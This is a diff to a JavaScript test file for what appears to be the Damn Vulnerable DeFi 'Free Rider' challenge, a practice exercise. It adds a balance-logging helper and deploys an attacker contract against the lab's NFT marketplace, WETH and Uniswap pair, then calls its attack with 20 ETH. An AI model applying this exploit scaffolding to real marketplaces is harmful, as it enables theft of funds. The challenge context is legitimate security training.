@@ -105,6 +105,40 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        async function logState(message, attacker_sing, marketplace, token, weth, nft, buyer) {
+            const denominator = 10**18;
+            console.log(message);
+            console.log("ETH:");
+            console.log("---attacker:")
+            console.log(Number(await ethers.provider.getBalance(attacker_sing.address))/denominator);
+            console.log('---marketplace:')
+            console.log(Number(await ethers.provider.getBalance(marketplace.address))/denominator);
+            console.log("DVT:");
+            console.log("---attacker:");
+            console.log(Number(await token.balanceOf(attacker_sing.address))/denominator);
+            console.log("WETH:");
+            console.log("---attacker:");
+            console.log(Number(await weth.balanceOf(attacker_sing.address))/denominator);
+            console.log("NFTs:");
+            console.log("---buyer:");
+            console.log(Number(await nft.balanceOf(buyer.address)));
+        }
+        this.nft.balanceOf
+
+        logState("=== INIT STATE ===", attacker_sing = attacker, marketplace = this.marketplace, token = this.token, weth = this.weth, this.nft, this.buyerContract);
+
+        this.attacker = await (await ethers.getContractFactory('AttackerFreeRider', attacker)).deploy(
+            // address _market, address _buyer, address _weth, address _uniswap, address _nft
+            this.marketplace.address,
+            this.buyerContract.address,
+            this.weth.address,
+            this.uniswapPair.address,
+            this.nft.address
+        );
+        this.attacker.attack(ethers.utils.parseEther('20'));
+
+        logState("=== END STATE ===", attacker_sing = attacker, marketplace = this.marketplace, token = this.token, weth = this.weth, this.nft, this.buyerContract);
     });
 
     after(async function () {
